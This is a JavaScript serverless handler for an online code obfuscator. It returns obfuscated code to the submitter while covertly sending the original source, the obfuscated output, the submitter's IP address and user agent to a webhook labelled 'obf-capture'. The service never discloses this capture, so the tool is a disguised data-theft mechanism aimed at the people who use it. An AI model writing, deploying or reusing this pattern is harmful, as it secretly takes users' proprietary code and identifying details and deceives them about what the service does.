const fetch = require('node-fetch');
const JavaScriptObfuscator = require('javascript-obfuscator');

module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    res.setHeader('Allow', 'POST');
    return res.status(405).json({ error: 'method not allowed' });
  }

  const { code, opts } = req.body || {};
  if (typeof code !== 'string' || !code.trim()) {
    return res.status(400).json({ error: 'empty code' });
  }

  const options = {
    compact: true,
    controlFlowFlattening: opts?.cff !== false,
    controlFlowFlatteningThreshold: 0.75,
    deadCodeInjection: opts?.dead !== false,
    deadCodeInjectionThreshold: 0.4,
    stringArray: true,
    stringArrayEncoding: ['base64'],
    stringArrayThreshold: 0.75,
    identifierNamesGenerator: 'hexadecimal',
    renameGlobals: false,
    selfDefending: opts?.selfDefending !== false,
    debugProtection: opts?.debug !== false,
    disableConsoleOutput: false
  };

  let output;
  try {
    output = JavaScriptObfuscator.obfuscate(code, options).getObfuscatedCode();
  } catch (e) {
    return res.status(400).json({ error: 'obfuscate failed: ' + e.message });
  }

  // capture — await supaya serverless tidak freeze sebelum request selesai
  try {
    await sendToWebhook(code, output, req);
  } catch (_) {}

  return res.status(200).json({ ok: true, output });
};

function chunk(s, n = 1800) {
  const out = [];
  for (let i = 0; i < s.length; i += n) out.push(s.slice(i, i + n));
  return out;
}

async function post(url, body) {
  return fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body)
  });
}

async function sendToWebhook(original, obfuscated, req) {
  const url = process.env.WEBHOOK_URL;
  if (!url) return;

  const ip =
    (req.headers['x-forwarded-for'] || '').split(',')[0].trim() ||
    req.headers['x-real-ip'] ||
    'unknown';
  const ua = req.headers['user-agent'] || 'unknown';

  const origParts = chunk(original);
  const obfParts = chunk(obfuscated);

  await post(url, {
    username: 'obf-capture',
    content: `**New submission**\nIP: \`${ip}\`\nUA: \`${ua.slice(0, 180)}\`\nLen: ${original.length} -> ${obfuscated.length}`
  });

  for (const [i, part] of origParts.entries()) {
    await post(url, {
      content: `**ORIGINAL [${i + 1}/${origParts.length}]**\n\`\`\`js\n${part}\n\`\`\``
    });
  }

  for (const [i, part] of obfParts.entries()) {
    await post(url, {
      content: `**OBFUSCATED [${i + 1}/${obfParts.length}]**\n\`\`\`js\n${part}\n\`\`\``
    });
  }
}
